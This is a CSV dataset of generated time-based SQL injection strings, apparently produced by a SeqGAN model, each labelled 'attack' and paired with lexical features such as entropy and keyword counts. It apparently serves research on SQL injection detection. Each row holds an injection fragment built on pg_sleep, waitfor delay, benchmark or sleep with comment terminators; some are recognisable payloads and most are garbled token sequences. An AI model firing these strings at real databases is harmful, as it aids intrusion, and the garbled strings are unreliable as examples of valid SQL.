label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""cio,1 or pg_sleep  =  (  5 ellt if or d 4240 el  n '0:0:2' not  =  4287 e(  = 2388  delay waitfor from where e delay 8036  =  1361 if or 2388 delay n    =  5466  =  8036 % or from if where 7739 s 8140 waitfor 0 delay 6793  = not  = 2840 delay benchmark  (  'isintegratedsecurityonly' y    ,  if andsp not  (  )     )    a  waitfor from not delay 7260  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,408,431.0,41.0,4.230738708861914,185.0,68.0,144.0,34.0,0.42923433874709976,0.15777262180974477,0.33410672853828305,0.07888631090487239,4.0,2.0,0.0,0.0,0.0,9.0,0.0,12.0,1.0,2.0,2.0,9.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,4.0,1.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,3.0,6.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,23.0
attack,""" or delay2657 = 8140  (  = information_schemaelt  (  =' delay delay '0:0:2' from delay '0:0:__TIME__'waitfor delay '0:0:__TIME__'sleep  (  =  6272-- delay 4240 3885  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,409,169.0,38.0,4.661457933878414,76.0,27.0,32.0,34.0,0.44970414201183434,0.15976331360946747,0.1893491124260355,0.20118343195266272,7.0,1.0,4.0,0.0,0.0,4.0,0.0,3.0,0.0,9.0,0.0,8.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,'  )   from delay and '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,410,38.0,21.0,4.017535737070863,16.0,2.0,8.0,12.0,0.42105263157894735,0.05263157894736842,0.21052631578947367,0.3157894736842105,3.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%""  )sq   o --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,411,15.0,9.0,2.739572261986723,3.0,1.0,6.0,5.0,0.2,0.06666666666666667,0.4,0.3333333333333333,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1 where s 6456  =      ( 4287  =    ( or 9862 --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,412,48.0,18.0,3.2309301386270426,8.0,13.0,21.0,6.0,0.16666666666666666,0.2708333333333333,0.4375,0.125,0.0,0.0,2.0,0.0,0.0,2.0,0.0,2.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack, if where1    =  1 waitfor delay or waitfor  or 4240 select 4287  =  1 25    =  8140 =  5702 where delay delay delay  '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,413,134.0,31.0,4.226741810299842,60.0,23.0,37.0,14.0,0.44776119402985076,0.17164179104477612,0.27611940298507465,0.1044776119402985,2.0,0.0,2.0,0.0,0.0,4.0,0.0,0.0,0.0,4.0,0.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"""  )    or delay (  (  I where and '0:0:2'l '0:0:2' delay '0:0:2' --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,414,68.0,20.0,3.7012937562935333,22.0,9.0,19.0,18.0,0.3235294117647059,0.1323529411764706,0.27941176470588236,0.2647058823529412,6.0,1.0,2.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,1 where 5466 elllrpelt  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,415,29.0,14.0,3.421722910492978,14.0,5.0,7.0,3.0,0.4827586206896552,0.1724137931034483,0.2413793103448276,0.10344827586206896,0.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,1%' weo or from,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,416,15.0,10.0,3.139572261986723,9.0,1.0,3.0,2.0,0.6,0.06666666666666667,0.2,0.13333333333333333,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"2657   )    and; '0:0:__TIME__'    =  (  ""     1361  =  7629 waitfor pg_sleep  =  (  ,sy n delay delay delay not  = 7629 from if and from elt d5  = dpppo k 5702  (  =svem  s be t where 3885  =  ( or fromhwaitfor delay from 4240 noth , delay (  (  =  ' delay -- if waitfor '0:0:2' delay  (  =  4287  'sa' waitfor delay  8781 5702=  (  = ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,417,336.0,45.0,4.368244424044714,143.0,46.0,105.0,42.0,0.4255952380952381,0.13690476190476192,0.3125,0.125,7.0,1.0,2.0,0.0,0.0,11.0,1.0,9.0,0.0,5.0,2.0,13.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,3.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,8.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,18.0
attack,1 waitfor delay '0:0:__TIME__'--'||  (  select ' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,418,51.0,26.0,4.313911371086313,22.0,3.0,9.0,17.0,0.43137254901960786,0.058823529411764705,0.17647058823529413,0.3333333333333333,4.0,0.0,4.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,6.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%'||  (  select 'r%iaf""   )     aika""  =  "" if or elt  (  = 8036 6784  =  (  and delay waitfor  benchmark  (  ,waitfor '0:0:__TIME__'-- x from 0 p if not    =  =  1361  =   9862  = '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,419,198.0,45.0,4.415354834268194,71.0,22.0,63.0,42.0,0.35858585858585856,0.1111111111111111,0.3181818181818182,0.21212121212121213,6.0,3.0,4.0,0.0,0.0,7.0,0.0,5.0,2.0,8.0,1.0,13.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"""  (s if where 8594 '0:0:__TIME__'=  =  8781 ellt__uS    (  or 3885 delay froml and (  =  "" not 9443 sleep  (  3114  (  0x6d457153  (  f delay not  =  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,420,153.0,40.0,4.36199508806463,52.0,30.0,47.0,24.0,0.33986928104575165,0.19607843137254902,0.30718954248366015,0.1568627450980392,2.0,2.0,2.0,0.0,0.0,4.0,0.0,6.0,0.0,6.0,0.0,6.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1  )    asspt kdonoai or  sleep  (  5   6866 delay delay information_schemawhere z  =  =  =  sleep or from sleep  (  sleep  (  5,sleep  (  sleep  ( delay d5  _  (  5  )  and    benchmark  (    (  )    )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,421,207.0,31.0,3.730846533497681,101.0,9.0,78.0,19.0,0.48792270531400966,0.043478260869565216,0.37681159420289856,0.09178743961352658,0.0,0.0,0.0,0.0,0.0,3.0,0.0,12.0,0.0,2.0,1.0,3.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack,"1""   )    )    <> @ohropo where 1361  (  =  , not  (  em if 24  6784 pg_sleep  =  from where 7739  =  (   delay not  =  =  _lt 1361 --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,422,134.0,36.0,3.922872613488779,44.0,19.0,52.0,19.0,0.3283582089552239,0.1417910447761194,0.3880597014925373,0.1417910447761194,0.0,1.0,2.0,0.0,0.0,5.0,0.0,5.0,0.0,2.0,1.0,9.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1   select not   (    ( "" or sleep  (  __TIME__  )    =  ""      sleep  (  5000000(  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,423,90.0,23.0,3.2496464554767965,25.0,8.0,41.0,16.0,0.2777777777777778,0.08888888888888889,0.45555555555555555,0.17777777777777778,0.0,2.0,2.0,0.0,0.0,1.0,0.0,7.0,0.0,4.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  """"  2388  = not  =     =    (  )    )    then not  (  _  =  select delayu waitfor not  (    =  select from from from delay 7629ll 6793 6784 delay  (  8781 -- from if delayelt (    sleep  =  8781  =  er 9862vell v  (  select 3824 delay '0:0:2' '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,424,337.0,43.0,4.1360364363961,125.0,47.0,122.0,43.0,0.37091988130563797,0.1394658753709199,0.3620178041543027,0.12759643916913946,4.0,3.0,4.0,0.0,0.0,8.0,0.0,14.0,0.0,6.0,0.0,12.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,1 where 8781  =  from delay t 1361  =  benchmark  (  select not  =  =  f --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,425,75.0,26.0,3.8672726271222544,34.0,9.0,25.0,7.0,0.4533333333333333,0.12,0.3333333333333333,0.09333333333333334,0.0,0.0,2.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"'  delay and benchmark  (  _TIMD'  =  'd5  (  5000000,md5  (  5873      )    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,426,79.0,29.0,3.759715490214155,24.0,13.0,30.0,12.0,0.3037974683544304,0.16455696202531644,0.379746835443038,0.1518987341772152,3.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,1.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,""" waitfor or sleep  (  ,md5  (  (  5873,mdME___  sleep  (    (  select )    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,427,78.0,27.0,3.7983507342101066,31.0,5.0,28.0,14.0,0.3974358974358974,0.0641025641025641,0.358974358974359,0.1794871794871795,0.0,1.0,2.0,0.0,0.0,0.0,0.0,6.0,0.0,3.0,2.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,1%`%' *  benchmark  p from and 4240 --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,428,38.0,23.0,4.1287347499440905,17.0,5.0,9.0,7.0,0.4473684210526316,0.13157894736842105,0.23684210526315788,0.18421052631578946,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,1    3885 where 5702 not  =  = du not  (  select '0:0:2' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,429,59.0,25.0,3.9128057991965015,19.0,12.0,19.0,9.0,0.3220338983050847,0.2033898305084746,0.3220338983050847,0.15254237288135594,2.0,0.0,2.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1'   25      =  )    and benchmark and   waitfor ,sleep  (  6272,sleep  (  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,430,80.0,31.0,3.8381843311279016,32.0,7.0,32.0,9.0,0.4,0.0875,0.4,0.1125,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%""   )    or",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,431,13.0,7.0,2.1887870678023824,2.0,1.0,7.0,3.0,0.15384615384615385,0.07692307692307693,0.5384615384615384,0.23076923076923078,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"where 5466  , --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,432,16.0,10.0,3.125,5.0,4.0,4.0,3.0,0.3125,0.25,0.25,0.1875,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,1   select;if not  (  select and not  =  (  sleep  (  7739  pg_sleep  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,433,75.0,24.0,3.6624707547870967,35.0,5.0,26.0,9.0,0.4666666666666667,0.06666666666666667,0.3466666666666667,0.12,0.0,0.0,2.0,0.0,0.0,1.0,1.0,4.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack, '  =  =  6784 delay delay delay not  (  (  =     7739 sleep  =  select waitfor  4240 delay and delay 7629 --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,434,109.0,28.0,3.869226618373699,49.0,16.0,35.0,9.0,0.44954128440366975,0.14678899082568808,0.3211009174311927,0.08256880733944955,1.0,0.0,2.0,0.0,0.0,4.0,0.0,2.0,0.0,0.0,0.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,1s where (  )     waitfor delay 2657 delay 2388  =       not  =  =  3114  or delay or and sleep  (  5    )    )    )    or sleep  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,435,135.0,28.0,3.5162747281162576,50.0,14.0,59.0,12.0,0.37037037037037035,0.1037037037037037,0.43703703703703706,0.08888888888888889,0.0,0.0,2.0,0.0,0.0,3.0,0.0,7.0,0.0,0.0,0.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,1 if 'sa' where 7629 --  (  (  6784 delay * not  --     (  (  =so 3885 delay not  (  5702 delay '0:0:2' '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,436,120.0,36.0,4.301410682773665,36.0,22.0,35.0,27.0,0.3,0.18333333333333332,0.2916666666666667,0.225,6.0,0.0,6.0,0.0,1.0,1.0,0.0,5.0,0.0,4.0,0.0,8.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1""   )    )   or when   ,5466  5 sleep  =  elt  (  1   (  3114 6784  =  =  _ waitfor delay  Eseltylq where 2657  =  8036  (  'sysadmin' and  or and if 4240  =  benchmark  (  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,437,179.0,39.0,4.055416246056103,66.0,27.0,68.0,18.0,0.3687150837988827,0.15083798882681565,0.37988826815642457,0.1005586592178771,2.0,1.0,0.0,0.0,0.0,5.0,0.0,7.0,0.0,1.0,1.0,5.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""a""   )    )    or sleep  (  __TIME__  )    =  "" e(( from delay where 6784  =  =  9443 dvr where 5702 6784 delay  = 6969  delay '0:0:2' '0:0:__TIME__'Mu from from (l delay '0:0:2' from not  7739 delay or from sleep  (  0x6d457153 d  (  (  5   )    )    select 8466lt  =  =  if where  (  8036 from information_schemael  (  (  3114 -- 8594  ( not not  (  =   not  (  8140 waitfor delay . where waitfor where delay and  '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,438,511.0,45.0,4.363773122727026,201.0,73.0,166.0,71.0,0.3933463796477495,0.14285714285714285,0.324853228962818,0.13894324853228962,8.0,4.0,4.0,0.0,0.0,8.0,0.0,24.0,0.0,14.0,0.0,12.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,5.0,7.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,2.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,30.0
attack,"""   )    )    or sleep  (  __TIME__  )    =  "" and  9443 sleep  9443  (  _TIME__TIME_sd5  10000000,md5  benchmark  (  0x6d457153   )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,439,137.0,35.0,4.020482624379044,42.0,26.0,49.0,20.0,0.30656934306569344,0.1897810218978102,0.35766423357664234,0.145985401459854,0.0,2.0,0.0,0.0,0.0,1.0,0.0,7.0,0.0,8.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
